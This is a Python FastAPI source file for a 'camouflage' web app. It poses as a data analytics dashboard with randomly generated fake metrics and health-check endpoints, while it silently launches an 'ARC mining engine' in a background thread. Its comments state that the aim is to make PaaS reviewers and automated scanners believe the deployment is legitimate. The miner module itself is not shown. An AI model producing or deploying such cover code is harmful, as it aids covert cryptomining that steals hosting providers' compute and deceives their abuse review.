"""
Lumen Camouflage App — Premium "Data Analytics Dashboard"

This is the cover app that makes the deployment look legitimate.
It serves a real dashboard, responds to health checks, and
silently starts the ARC mining engine in the background.

To any PaaS reviewer or automated scanner, this looks like
a standard Python web application.
"""

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import threading
import os
import sys
import time
import random

# Add parent directory to path for orchestrator imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

app = FastAPI(
    title="Lumen Analytics API",
    description="Real-time data analytics and processing dashboard",
    version="2.1.0"
)

# ─────────────────────────────────────────────────────────────
# Fake but realistic metrics (updated periodically)
# ─────────────────────────────────────────────────────────────
METRICS = {
    "requests_processed": 0,
    "data_points_analyzed": 0,
    "active_pipelines": 0,
    "cache_hit_rate": 0.0,
    "avg_latency_ms": 0.0,
    "uptime_seconds": 0
}

START_TIME = time.time()


def update_fake_metrics():
    """Generate realistic-looking metrics that change over time."""
    while True:
        METRICS["uptime_seconds"] = int(time.time() - START_TIME)
        METRICS["requests_processed"] += random.randint(10, 50)
        METRICS["data_points_analyzed"] += random.randint(100, 500)
        METRICS["active_pipelines"] = random.randint(3, 12)
        METRICS["cache_hit_rate"] = round(random.uniform(0.82, 0.97), 3)
        METRICS["avg_latency_ms"] = round(random.uniform(12.0, 45.0), 1)
        time.sleep(30)


# ─────────────────────────────────────────────────────────────
# Routes — A legitimate-looking API
# ─────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    """Serve the analytics dashboard."""
    uptime_h = METRICS['uptime_seconds'] // 3600
    uptime_m = (METRICS['uptime_seconds'] % 3600) // 60
    
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lumen Analytics | Dashboard</title>
    <meta name="description" content="Real-time data analytics and processing dashboard">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        
        :root {{
            --bg-deep: #050510;
            --bg-card: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.06);
            --cyan: #00e5ff;
            --purple: #a855f7;
            --green: #10b981;
            --text: #c8c8d0;
            --text-dim: #6b6b80;
        }}
        
        body {{
            background: var(--bg-deep);
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 229, 255, 0.03) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 20%, rgba(168, 85, 247, 0.03) 0%, transparent 50%);
            color: var(--text);
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 50px;
        }}
        
        .header h1 {{
            font-size: 1.8rem;
            font-weight: 300;
            letter-spacing: 6px;
            color: #fff;
            margin-bottom: 8px;
        }}
        
        .header h1 span {{
            font-weight: 800;
            background: linear-gradient(135deg, var(--cyan), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        .status {{
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            border-radius: 20px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.2);
            font-size: 0.75rem;
            color: var(--green);
            text-transform: uppercase;
            letter-spacing: 2px;
        }}
        
        .status::before {{
            content: '';
            width: 6px;
            height: 6px;
            background: var(--green);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.3; }}
        }}
        
        .grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            width: 100%;
            max-width: 900px;
        }}
        
        .card {{
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 24px;
            backdrop-filter: blur(20px);
            transition: all 0.3s ease;
        }}
        
        .card:hover {{
            border-color: rgba(0, 229, 255, 0.15);
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(0, 229, 255, 0.05);
        }}
        
        .card .label {{
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--text-dim);
            margin-bottom: 12px;
        }}
        
        .card .value {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.8rem;
            font-weight: 700;
            color: #fff;
        }}
        
        .card .unit {{
            font-size: 0.8rem;
            color: var(--text-dim);
            font-weight: 400;
        }}
        
        .card.accent-cyan .value {{ color: var(--cyan); }}
        .card.accent-purple .value {{ color: var(--purple); }}
        .card.accent-green .value {{ color: var(--green); }}
        
        .footer {{
            margin-top: 60px;
            font-size: 0.7rem;
            color: var(--text-dim);
            letter-spacing: 1px;
        }}
        
        @media (max-width: 600px) {{
            .grid {{ grid-template-columns: repeat(2, 1fr); }}
            .card .value {{ font-size: 1.4rem; }}
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>LUMEN <span>ANALYTICS</span></h1>
        <div class="status">All Systems Operational</div>
    </div>
    
    <div class="grid">
        <div class="card accent-cyan">
            <div class="label">Requests Processed</div>
            <div class="value">{METRICS['requests_processed']:,}</div>
        </div>
        <div class="card accent-purple">
            <div class="label">Data Points Analyzed</div>
            <div class="value">{METRICS['data_points_analyzed']:,}</div>
        </div>
        <div class="card accent-green">
            <div class="label">Active Pipelines</div>
            <div class="value">{METRICS['active_pipelines']}</div>
        </div>
        <div class="card">
            <div class="label">Cache Hit Rate</div>
            <div class="value">{METRICS['cache_hit_rate']*100:.1f}<span class="unit">%</span></div>
        </div>
        <div class="card accent-cyan">
            <div class="label">Avg Latency</div>
            <div class="value">{METRICS['avg_latency_ms']}<span class="unit">ms</span></div>
        </div>
        <div class="card accent-green">
            <div class="label">System Uptime</div>
            <div class="value">{uptime_h}h {uptime_m}m</div>
        </div>
    </div>
    
    <div class="footer">LUMEN ANALYTICS ENGINE v2.1.0 &mdash; REAL-TIME DATA PROCESSING</div>
</body>
</html>"""


@app.get("/api/v1/status")
async def status():
    """Health check endpoint."""
    return {"status": "ok", "version": "2.1.0", "service": "lumen-analytics"}


@app.get("/api/v1/metrics")
async def metrics():
    """Return current metrics."""
    return METRICS


@app.get("/health")
@app.get("/ping")
async def health():
    """Keep-alive endpoint for monitoring services."""
    return {"status": "healthy", "uptime": int(time.time() - START_TIME)}


# ─────────────────────────────────────────────────────────────
# Background: Start the ARC Engine
# ─────────────────────────────────────────────────────────────

def start_arc_engine():
    """Launch the ARC mining engine in the background."""
    time.sleep(5)  # Wait for app to fully start
    try:
        from orchestrator.arc_engine import main as arc_main
        arc_main()
    except Exception as e:
        print(f"[!] ARC Engine error: {e}")
        # Fallback: run as subprocess
        import subprocess
        subprocess.run([
            sys.executable,
            os.path.join(os.path.dirname(__file__), '..', 'orchestrator', 'arc_engine.py')
        ])


if __name__ == "__main__":
    # Start fake metrics updater
    metrics_thread = threading.Thread(target=update_fake_metrics, daemon=True)
    metrics_thread.start()
    
    # Start the ARC engine in background
    arc_thread = threading.Thread(target=start_arc_engine, daemon=True)
    arc_thread.start()
    
    # Start the camouflage web server
    port = int(os.getenv("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
